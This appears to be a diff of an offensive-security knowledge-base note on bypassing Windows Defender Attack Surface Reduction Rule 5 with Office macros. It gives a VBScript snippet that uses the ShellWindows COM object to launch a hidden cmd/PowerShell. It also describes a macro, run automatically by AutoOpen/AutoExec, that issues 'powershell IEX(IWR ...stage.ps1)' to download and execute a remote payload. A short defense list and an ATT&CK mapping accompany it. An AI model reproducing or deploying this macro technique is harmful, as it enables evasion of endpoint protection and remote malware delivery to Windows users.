@@ -36,11 +36,15 @@ Technical Explanation: ASR Bypass Create Child Process Rule 5 and Open PowerShel
 
 Business Value: This technique can be used by attackers to execute malicious code on a target system without being detected by Windows Defender. By bypassing ASR Rule 5, attackers can execute PowerShell from the command prompt and use it to perform various malicious activities such as downloading and executing additional malware, stealing sensitive data, or performing reconnaissance on the target system.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. WMI COM functions enabled on the target system
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ Business Value: This technique can be used by attackers to execute malicious cod
 
 1. Monitor the system for suspicious activity and investigate any anomalies
 
+ 
+
 ## Objectives
 
 1. Bypass Windows Defender ASR Rule 5
@@ -58,12 +64,20 @@ Business Value: This technique can be used by attackers to execute malicious cod
 
 1. Execute malicious code on the target system
 
+ 
+
 # Instructions
 
 1. This command creates a child process to bypass ASR (Attack Surface Reduction) rules. It uses PowerShell to download and execute a payload from a remote server.
 
+ 
+
+
+
 **Code**: [[Sub ASR_bypass_create_child_process_rule5()
     Co]]
+
+
 
 > The 'ASR_bypass_create_child_process_rule5' function creates a new process using the 'Win32_Process' class in WMI. It sets the 'ShowWindow' property to 0 to hide the window of the new process. It then executes the command 'cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')' which downloads and executes a PowerShell script from the specified URL. This is achieved by using the 'Create' method of the 'Win32_Process' class. The 'AutoExec' and 'AutoOpen' subroutines are called to execute the 'ASR_bypass_create_child_process_rule5' function automatically when the document is opened or when a macro is executed.
 
@@ -72,9 +86,17 @@ Business Value: This technique can be used by attackers to execute malicious cod
 2. Type the command: powershell
 3. Press Enter
 
+ 
+
+
+
 **Code**: [[Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A]]
 
+
+
 > This script automates the above steps by using the Windows Script Host object model to open a new instance of the Windows Shell, and then execute the PowerShell command from there. The script launches the Command Prompt and then executes the PowerShell command, which opens a new PowerShell console window. The command is executed with administrative privileges, which allows the user to perform administrative tasks.
+
+
 
 **Command** ([[Open PowerShell]]):
 
@@ -83,6 +105,8 @@ Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
 Set SW = GetObject("new:" & ShellWindows).Item()
 SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -105,3 +129,5 @@ SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows
 
 - [[DOCM - WMI COM functions]]
 - [[Office - Attacks]]
+
+
